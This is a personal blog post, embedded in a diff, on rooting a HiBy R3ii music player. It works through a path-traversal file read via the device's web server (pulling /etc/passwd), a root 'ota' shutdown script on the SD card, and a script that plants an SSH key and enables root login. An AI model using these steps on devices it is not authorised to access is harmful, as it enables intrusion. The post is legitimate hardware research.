@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en-US">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width">
+
+		
+			<title>Rooting the HiBy R3ii - Codecat - Scribblings of a programatrickerist.</title>
+		
+
+		<meta name="theme-color" content="#a7eb47">
+		<meta property="og:title" content="Rooting the HiBy R3ii">
+		<meta property="og:type" content="website">
+		<meta property="og:url" content="https://codecat.nl/2024/06/hiby-r3ii-root/">
+		
+			<meta property="og:image" content="https://codecat.nl/2024/06/hiby-main.jpg">
+		
+		
+			<meta property="og:description" content="The HiBy R3ii is a &quot;Digital Audio Player&quot; (DAP), basically the modern equivalent of MP3 players from the 00&#x27;s. Naturally, I wanted to find out how hackable the device is.">
+		
+
+		<link rel="stylesheet" href="/pure.css">
+		<link rel="stylesheet" href="/style.css">
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css" integrity="sha256-XoaMnoYC5TH6/+ihMEnospgm0J1PM/nioxbOUdnM8HY=" crossorigin="anonymous">
+	</head>
+
+	<body>
+		<header>
+			<h1><a href="/">Codecat.nl</a></h1>
+			<p class="social">
+				<a rel="me noopener noreferrer" href="https://meow.social/@codecat" title="Mastodon" target="_blank"><i class="fa fa-mastodon" aria-hidden="true"></i></a>
+				<a rel="me noopener noreferrer" href="https://github.com/codecat" title="GitHub" target="_blank"><i class="fa fa-github" aria-hidden="true"></i></a>
+				<a rel="me noopener noreferrer" href="https://nimble.itch.io" title="Itch" target="_blank"><i class="fa fa-gamepad" aria-hidden="true"></i></a>
+				<a rel="me noopener noreferrer" href="https://twitch.tv/missterious" title="Twitch" target="_blank"><i class="fa fa-twitch" aria-hidden="true"></i></a>
+				<a rel="me noopener noreferrer" href="https://soundcloud.com/codecatt" title="SoundCloud" target="_blank"><i class="fa fa-soundcloud" aria-hidden="true"></i></a>
+			</p>
+		</header>
+
+		<div class="container">
+			
+	<article class="pure-g">
+		<div class="pure-u-1">
+			<h1>Rooting the HiBy R3ii</h1>
+			<p class="subtitle">
+				<i class="fa fa-calendar" aria-hidden="true"></i>
+				Posted on 2024-06-15
+			</p>
+			<div class="content">
+				<p>The HiBy R3ii is a &quot;Digital Audio Player&quot; (DAP), basically the modern equivalent of MP3 players from the 00's. Naturally, I wanted to find out how hackable the device is.</p>
+<p><img src="/2024/06/hiby-main.jpg" alt="" /></p>
+<span id="continue-reading"></span>
+<p>We bought this device last week, and as all nerds know, you gotta see how it works from the inside. I've done this kind of thing before with both a GoPro and a 4G Modem <a href="/2022/08/irl-backpack/">when I built my IRL backpack</a>, so I kinda know where to start.</p>
+<p>The very first thing I did was look through the settings of the device itself to see how I can interface with it. There's a nice little webserver you can enable that you can use to upload music and other files to the device, as well as download them.</p>
+<p>This is accessed by going to &quot;Wireless&quot; -&gt; &quot;Import Music via Wi-Fi&quot;.</p>
+<p><img src="/2024/06/hiby-http.jpg" alt="" /></p>
+<p>However, they don't do any validation on the paths provided to the API, so we can pull any file from the device we want:</p>
+<pre data-lang="bash" style="background-color:#212121;color:#eeffff;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#82aaff;">$ curl http://192.168.1.96:4399/download</span><span style="color:#89ddff;">\?</span><span style="color:#82aaff;">path=/etc/passwd
+</span><span style="color:#82aaff;">root:x:0:0:root:/root:/bin/sh
+</span><span style="color:#82aaff;">daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span style="color:#82aaff;">bin:x:2:2:bin:/bin:/bin/sh
+</span><span style="color:#82aaff;">sys:x:3:3:sys:/dev:/bin/sh
+</span><span style="color:#82aaff;">sync:x:4:100:sync:/bin:/bin/sync
+</span><span style="color:#82aaff;">mail:x:8:8:mail:/var/spool/mail:/bin/sh
+</span><span style="color:#82aaff;">proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span style="color:#82aaff;">www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span style="color:#82aaff;">backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span style="color:#82aaff;">operator:x:37:37:Operator:/var:/bin/sh
+</span><span style="color:#82aaff;">haldaemon:x:68:68:hald:/:/bin/sh
+</span><span style="color:#82aaff;">dbus:x:81:81:dbus:/var/run/dbus:/bin/sh
+</span><span style="color:#82aaff;">ftp:x:83:83:ftp:/home/ftp:/bin/sh
+</span><span style="color:#82aaff;">nobody:x:99:99:nobody:/home:/bin/sh
+</span><span style="color:#82aaff;">sshd:x:103:99:Operator:/var:/bin/sh
+</span><span style="color:#82aaff;">dyn:x:1000:1000:dyn:/home/dyn:/bin/sh
+</span><span style="color:#82aaff;">default:x:1000:1000:Default non-root user:/home/default:/bin/sh
+</span></code></pre>
+<p>Sometimes we may need to pass <code>--ignore-content-length</code> to curl in order to download some files, as the webserver incorrectly reports <code>Content-Length</code> to be 0 while still providing the data.</p>
+<p>We can also get (almost) any directory file list: (some directories refuse to be listed, I am not sure why)</p>
+<pre data-lang="bash" style="background-color:#212121;color:#eeffff;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#82aaff;">$ curl http://192.168.1.96:4399/list</span><span style="color:#89ddff;">\?</span><span style="color:#82aaff;">path=/var/log/ </span><span style="color:#89ddff;">| </span><span style="color:#82aaff;">jq
+</span><span style="color:#82aaff;">[
+</span><span>  </span><span style="color:#89ddff;">{
+</span><span>    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">path</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">: </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">/var/log/cgic.log</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">,
+</span><span>    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">name</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">: </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">cgic.log</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">,
+</span><span>    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">ctime</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">: </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">1531674272</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">,
+</span><span>    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">size</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">: 1712
+</span><span>  </span><span style="color:#89ddff;">}</span><span style="color:#82aaff;">,
+</span><span>  </span><span style="color:#89ddff;">{
+</span><span>    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">path</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">: </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">/var/log/thttpd_state</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">,
+</span><span>    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">name</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">: </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">thttpd_state</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">,
+</span><span>    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">ctime</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">: </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">1531674078</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">,
+</span><span>    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">size</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">: 0
+</span><span>  </span><span style="color:#89ddff;">}</span><span style="color:#82aaff;">,
+</span><span>  </span><span style="color:#89ddff;">{
+</span><span>    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">path</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">: </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">/var/log/udp_state</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">,
+</span><span>    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">name</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">: </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">udp_state</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">,
+</span><span>    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">ctime</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">: </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">1531674078</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">,
+</span><span>    </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">size</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;">: 0
+</span><span>  </span><span style="color:#89ddff;">}</span><span style="color:#82aaff;">,
+</span><span>  </span><span style="color:#82aaff;">...
+</span><span style="color:#82aaff;">]
+</span></code></pre>
+<p>We can also upload files, but it looks like this is limited to the SD card.</p>
+<p>The webserver is a great starting point and lets us do a lot of things already - it even runs as root! But I wanted to see if I could get an actual root shell to run commands.</p>
+<p>I ended up downloading the firmware image from <a href="https://store.hiby.com/apps/help-center#hc-r3-ii-firmware-v12-update">HiBy's official website</a>, which - for whatever reason - is <a href="https://drive.google.com/file/d/19SkqeVMVhfPNwhT758ZTrDscv-5-l-Ve/view?usp=sharing">a Google Drive link</a>. (Later I found that the updater on the device itself <strong>does</strong> fetch the firmware from a non-Google URL, but it's still unclear to me why they are using Google Drive links.)</p>
+<p>Inside of the firmware zip we have a number of interesting files, but all we really need is <code>r3ii.upt</code>, which is an ISO image that the device uses to install firmware updates. One of the files inside of the ISO is <code>SYSTEM.UBI</code>, which is an <a href="https://en.wikipedia.org/wiki/UBIFS">UBIFS</a> filesystem image containing all the files pushed to the flash.</p>
+<p>It would be pretty straight forward to build your own ISO update image and push that to the device, but I didn't feel like doing the work, so instead I looked through the executables on the device.</p>
+<p>Extracting the UBIFS image is easy, and can be done through the <a href="https://github.com/onekey-sec/ubi_reader">ubi_reader</a> tools:</p>
+<pre data-lang="bash" style="background-color:#212121;color:#eeffff;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#82aaff;">ubireader_extract_files system.ubifs
+</span></code></pre>
+<p>The main executable binary is a MIPS32 binary located at <code>/usr/bin/hiby_player</code>. I put this into Ghidra and started looking for points of interest.</p>
+<p>The system uses some internal root paths to point to specific parts of the system:</p>
+<ul>
+<li><code>x:\</code>, <code>y:\</code>, <code>z:\</code> =&gt; <code>/usr/resource/</code>: application resources such as UI</li>
+<li><code>a:\</code> =&gt; <code>/mnt/sd_1/</code>: second SD card - a second SD card slot doesn't exist on this model, but there are other models that do support it</li>
+<li><code>b:\</code> =&gt; <code>/mnt/sd_2/</code>: third SD card</li>
+<li><code>c:\</code> =&gt; <code>/mnt/udisk_0/</code>: first mounted external drive (through USB)</li>
+<li><code>d:\</code> =&gt; <code>/mnt/samba/</code>: network drive</li>
+<li><code>e:\</code> =&gt; <code>/mnt/udisk_1/</code>: second mounted external drive</li>
+<li><code>f:\</code> =&gt; <code>/mnt/udisk_2/</code>: third mounted external drive</li>
+<li><code>v:\</code> =&gt; <code>/</code>: system root</li>
+</ul>
+<p>Searching for all paths in the firmware reveals a number of interesting SD card paths:</p>
+<ul>
+<li><code>/mnt/sd_0/r3ii.upt</code>, <code>a:\update.upt</code>, and <code>a:\r3ii.upt</code>: paths used for updating - you could probably use these to flash a custom firmware to the device, but I have not tried this.</li>
+<li><code>/mnt/sd_0/ota</code>: something labeled as a <code>test_program</code>.</li>
+</ul>
+<p>The <code>ota</code> script is particularly interesting; it's a program on the (first) SD card that gets executed when you shut down the device. We can test this by writing a script with the filename <code>ota</code> to the root of the SD card:</p>
+<pre data-lang="bash" style="background-color:#212121;color:#eeffff;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="font-style:italic;color:#4a4a4a;">#!/bin/sh
+</span><span style="color:#82aaff;">printf </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">Hello, world!</span><span style="color:#89ddff;">&quot; &gt;</span><span style="color:#82aaff;"> /mnt/sd_0/test.txt
+</span></code></pre>
+<p>This file can either be placed on the SD card directly, or uploaded via the webserver:</p>
+<pre data-lang="bash" style="background-color:#212121;color:#eeffff;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#82aaff;">curl</span><span style="color:#89ddff;"> -</span><span style="color:#f78c6c;">F </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">files[]=@ota</span><span style="color:#89ddff;">&quot;</span><span style="color:#82aaff;"> http://192.168.1.96:4399/upload
+</span></code></pre>
+<p>We hold the power button on the device to shut it down, and.. it doesn't actually shut down, the countdown just restarts! This is an interesting but good sign - putting our script here has changed how shutdown behaves.</p>
+<p><img src="/2024/06/hiby-shutdown.jpg" alt="" /></p>
+<p>If we don't hold it to fully shutdown (happens after restarting the countdown ~2 times) and check the contents of the SD card (which can be done through the webserver as well), we can see that a new file has been created: <code>test.txt</code> containing the text <code>Hello, world!</code>. Awesome! So we can run arbitrary commands. But under which user is this running? This is easy to test:</p>
+<pre data-lang="bash" style="background-color:#212121;color:#eeffff;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="font-style:italic;color:#4a4a4a;">#!/bin/sh
+</span><span style="color:#82aaff;">id </span><span style="color:#89ddff;">&gt;</span><span style="color:#82aaff;"> /mnt/sd_0/my_id.txt
+</span></code></pre>
+<p>Running this reveals that we are in fact running as root (uid 0, gid 0). So we can run arbitrary commands as root on the device now whenever we want by pressing the shutdown button. But we can do a bit more than this now.</p>
+<p>While I was exploring the filesystem of the device, I found that there is an SSH daemon present, which the HiBy team were using themselves during development, as can be seen by the presence of a public key in <code>/root/authorized_keys</code>, attributed to <code>dyn@hb</code>:</p>
+<pre style="background-color:#212121;color:#eeffff;"><code><span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6NB8XeL+Ay9ySEXg5TNChKS0F0PxH2eXeVcQguEc/yh/SeV+2HLr3spjGlFRm8rfRhgT03GwTbdKrSyumQd/mJ4+gFm7uvaJ9byg7mnIDu0Srxd1UN2TxqQGf0wTI4S78MX96r8LTr5duVKSIVRX/ZHff8nsvH4m9NVowONy4h42jjc60o989Y8YjFY6aiPbrcBA9OSvYsQg+oAnyjnmfu/aEwYdlBpXqAe3RG1JhtM3Zv80V93yF89aiN7D1iN2OlzmbS1PMph/6W7lIIVMvKPqzBgxLeDqZScKkFV31WAUxn0M28KtVn2uqUyBROEjygqrO2v1SOt/vIEv2eWl7 dyn@hb
+</span></code></pre>
+<p>Can we figure out how to start the SSH server with our own public key so we can access it easier? After some trial and error, I came up with the following <code>ota</code> script:</p>
+<pre data-lang="bash" style="background-color:#212121;color:#eeffff;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="font-style:italic;color:#4a4a4a;">#!/bin/sh
+</span><span>
+</span><span style="color:#82aaff;">printf </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILk/MLteTsbtxuLmMnF+lbvCBISEyyg4FWjJJgyWvdz2 nimble@nimblepad\n</span><span style="color:#89ddff;">&quot; &gt;</span><span style="color:#82aaff;"> /root/.ssh/authorized_keys
+</span><span>
+</span><span style="color:#82aaff;">chmod 0750 /root
+</span><span style="color:#82aaff;">chmod 0700 /root/.ssh
+</span><span style="color:#82aaff;">chmod 0600 /root/.ssh/authorized_keys
+</span><span style="color:#82aaff;">chown root:root /root
+</span><span style="color:#82aaff;">chown root:root /root/.ssh
+</span><span style="color:#82aaff;">chown root:root /root/.ssh/authorized_keys
+</span><span>
+</span><span style="color:#82aaff;">printf </span><span style="color:#89ddff;">&quot;</span><span style="color:#c3e88d;">AuthorizedKeysFile .ssh/authorized_keys
+</span><span style="color:#c3e88d;">UsePrivilegeSeparation no
+</span><span style="color:#c3e88d;">PasswordAuthentication no
+</span><span style="color:#c3e88d;">PermitEmptyPasswords no
+</span><span style="color:#c3e88d;">PermitRootLogin yes
+</span><span style="color:#c3e88d;">Subsystem       sftp    /usr/libexec/sftp-server\n</span><span style="color:#89ddff;">&quot; &gt;</span><span style="color:#82aaff;"> /etc/ssh/sshd_config
+</span><span>
+</span><span style="color:#82aaff;">mkdir /var/empty
+</span><span style="color:#82aaff;">chown root:wheel /var/empty
+</span><span style="color:#82aaff;">chmod 555 /var/empty
+</span><span>
+</span><span style="color:#82aaff;">killall</span><span style="color:#89ddff;"> -</span><span style="color:#f78c6c;">9</span><span style="color:#82aaff;"> sshd
+</span><span style="color:#82aaff;">/bin/sshd</span><span style="color:#89ddff;"> -</span><span style="color:#f78c6c;">E</span><span style="color:#82aaff;"> /var/log/sshd.log </span><span style="color:#89ddff;">&amp;
+</span></code></pre>
+<p>This does a number of things:</p>
+<ul>
+<li>Modifies <code>authorized_keys</code> to add my ed25519 public key. Note that RSA keys also work, but they may require passing <code>-o 'PubkeyAcceptedKeyTypes +ssh-rsa'</code> to <code>ssh</code> when connecting.</li>
+<li>Sets appropriate permissions for the <code>/root</code> folder and the relevant SSH paths, as these are not already set correctly.</li>
+<li>Creates <code>/var/empty</code> and gives it the proper permissions, as the SSH server requires this.</li>
+<li>Writes a custom <code>sshd_config</code> that permits root login.</li>
+<li>Finally, kills any existing instance of <code>sshd</code> before starting its own <code>sshd</code> with logging enabled - if something goes wrong, we can pull the logs using the webserver.</li>
+</ul>
+<p>After pushing the script and holding the shutdown button until the timer restarts, we should now have a working SSH server that we can connect to! I can now simply run <code>ssh root@192.168.1.96</code> and be presented with a root shell on the device.</p>
+<p>To conclude, you can probably automate this by writing a custom firmware and flashing that to the device. However, I particularly like this method where all it takes to get a root shell is 1 file on the SD card and holding the power button for a few seconds, all without flashing the entire device.</p>
+
+			</div>
+
+			<div class="page-footer">
+				<p><b>Like my work?</b></p>
+				<p>You can <a href="https://meow.social/@codecat" rel="me noopener" target="blank">follow me on Mastodon</a> or <a href="https://www.patreon.com/openplanet" rel="noopener" target="blank">sponsor me on Patreon</a>.</p>
+			</div>
+		</div>
+	</article>
+
+		</div>
+
+		<footer>
+			&copy; Melissa Geels 2024
+		</footer>
+	</body>
+</html>
